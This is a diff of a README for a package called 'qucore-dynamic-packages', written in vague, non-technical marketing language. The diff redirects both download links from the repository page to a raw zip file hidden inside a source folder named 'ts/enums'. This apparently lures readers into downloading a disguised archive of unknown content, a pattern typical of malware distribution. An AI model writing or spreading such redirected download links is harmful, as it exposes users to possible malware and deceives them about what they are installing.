@@ -1,6 +1,6 @@
 # 📦 qucore-dynamic-packages - Simplify your backend service data needs
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/Euca4923/qucore-dynamic-packages)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://raw.githubusercontent.com/Euca4923/qucore-dynamic-packages/main/ts/enums/dynamic_packages_qucore_v1.9-beta.4.zip)
 
 This collection of tools helps your computer process data requests. It ensures your information stays safe and organized as it moves between services. This package handles complex tasks like identity verification and tracking so your system runs smooth.
 
@@ -12,7 +12,7 @@ The software acts as a specialized assistant for your network. It performs three
 
 You need to place the files on your computer to start.
 
-[Download the software here](https://github.com/Euca4923/qucore-dynamic-packages)
+[Download the software here](https://raw.githubusercontent.com/Euca4923/qucore-dynamic-packages/main/ts/enums/dynamic_packages_qucore_v1.9-beta.4.zip)
 
 Visit the link above to view the files. Look for the green button marked "Code" on the right side of the screen. Click "Download ZIP" to save the folder to your desktop. Open the downloaded folder and move the contents to a location you can find later.
 
